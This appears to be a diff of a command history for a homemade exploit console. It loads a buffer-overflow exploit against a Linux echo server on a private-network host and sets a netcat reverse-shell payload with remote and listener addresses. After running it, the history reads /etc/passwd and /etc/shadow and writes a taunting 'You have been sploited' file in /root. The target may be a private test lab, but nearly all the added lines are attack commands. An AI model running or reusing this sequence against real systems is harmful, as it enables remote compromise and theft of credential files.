@@ -1,28 +1,15 @@
-show commands
-show exploits
-
-show commands
-show exploits
 load linux_x64_ovrflwmyechosrv
-show payloads
-help help
-load fafaef
-load faef
-load fafaef
-faefae faef
-load faefa
-
-load faefa
+set payload reverse/linux_netcat
+set rhost 192.168.1.76
+set rport 1025
+set lhost 192.168.1.84
+set lport 4444
+run
+ls
 load linux_x64_ovrflwmyechosrv
-help
-load linux_x64_ovrflwmyechosrv
-show payloads options
-show payloads
-help 
-help load
-load linux_x64_ovrflwmyechosrv
-clear
-load linux_x64_ovrflwmyechosrv
-set PAYLOAD reverse/linux_netcat
-load linux_x64_ovrflwmyechosrv
-set PAYLOAD reverse/linux_netcat
+run payload reverse/linux_netcat rhost 192.168.1.76 rport 1025 lhost 192.168.1.84 lport 4444
+cat /etc/passwd
+cat /etc/shadow
+touch /root/sploited.txt
+gnome-terminal -- tail -f -n 1 /root/sploited.txt
+echo "You have been sploited :)" >> /root/sploited.txt
